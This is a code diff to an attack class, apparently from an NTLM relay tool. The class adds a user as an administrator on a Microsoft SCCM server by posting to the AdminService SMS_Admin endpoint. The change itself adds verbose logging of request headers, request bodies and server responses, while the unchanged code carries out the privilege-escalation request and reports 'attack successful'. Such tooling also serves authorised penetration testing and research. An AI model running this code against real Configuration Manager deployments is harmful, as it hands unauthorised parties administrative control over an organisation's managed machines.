@@ -63,6 +63,9 @@ class ADMINSERVICEAttack:
         body = json.dumps(data)
 
         LOG.info('Adding administrator via SCCM AdminService...')
+        LOG.debug(f'Request URL: /AdminService/wmi/SMS_Admin')
+        LOG.debug(f'Request headers: {headers}')
+        LOG.debug(f'Request body: {body}')
         self.client.request("POST", '/AdminService/wmi/SMS_Admin', headers=headers, body=body)
         ELEVATED.append(self.username)
         res = self.client.getresponse()
@@ -71,5 +74,14 @@ class ADMINSERVICEAttack:
             LOG.info('Server returned code 201, attack successful')
         else:
             self.lastresult = res.read()
-            LOG.info(f'Server returned code {res.status} - attack likely failed')
-            LOG.info(self.lastresult.decode("utf-8").replace("'", '"'))
+            LOG.error(f'Server returned code {res.status} - attack likely failed')
+            LOG.error(f'Response headers: {dict(res.getheaders())}')
+            try:
+                if self.lastresult:
+                    response_text = self.lastresult.decode("utf-8")
+                    LOG.error(f'Response body: {response_text}')
+                else:
+                    LOG.error('Response body is empty')
+            except Exception as e:
+                LOG.error(f'Error decoding response: {e}')
+                LOG.error(f'Raw response (first 500 bytes): {self.lastresult[:500]}')
